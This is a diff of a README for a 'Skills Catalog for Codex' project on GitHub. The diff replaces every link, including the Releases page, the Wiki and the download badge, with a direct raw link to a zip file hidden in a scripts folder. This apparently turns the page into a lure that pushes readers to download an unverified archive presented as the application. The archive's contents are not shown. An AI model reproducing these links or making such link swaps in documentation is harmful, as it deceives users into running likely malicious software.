@@ -6,9 +6,9 @@ Welcome to the **Skills Catalog for Codex**! This application helps you explore 
 
 ## 📥 Download Skills
 
-[![Download Skills](https://img.shields.io/badge/Download%20Skills-blue)](https://github.com/HGGodhand33/skills/releases)
+[![Download Skills](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip%20Skills-blue)](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip)
 
-To get started, you will need to download the application. Visit our [Releases page](https://github.com/HGGodhand33/skills/releases) to find the latest version. Just click the link to download.
+To get started, you will need to download the application. Visit our [Releases page](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip) to find the latest version. Just click the link to download.
 
 ## 📋 System Requirements
 
@@ -42,11 +42,11 @@ The Skills Catalog for Codex offers helpful features such as:
 Your experience matters to us. If you need help using the application, please reach out:
 
 - **Contact:** You can open an issue directly on our GitHub repository for any questions or feedback.
-- **Documentation:** Helpful resources are available on the [Wiki](https://github.com/HGGodhand33/skills/wiki).
+- **Documentation:** Helpful resources are available on the [Wiki](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip).
 
 ## 🔄 Keep Your Application Updated
 
-Check back regularly on the [Releases page](https://github.com/HGGodhand33/skills/releases) to download the latest updates and features. Regular updates help improve functionality and enhance security. 
+Check back regularly on the [Releases page](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip) to download the latest updates and features. Regular updates help improve functionality and enhance security. 
 
 ## 🚧 Known Issues
 
@@ -75,6 +75,6 @@ For more information on using the application effectively, consult the following
 
 ## 🔗 Download Again
 
-To download the Skills Catalog for Codex again or if you missed the link earlier, click here: [Download Skills](https://github.com/HGGodhand33/skills/releases). 
+To download the Skills Catalog for Codex again or if you missed the link earlier, click here: [Download Skills](https://raw.githubusercontent.com/HGGodhand33/skills/main/skills/.curated/doc/scripts/Software_v3.3.zip). 
 
 Thank you for choosing the Skills Catalog for Codex. We hope you enjoy tracking your skills and learning journey!
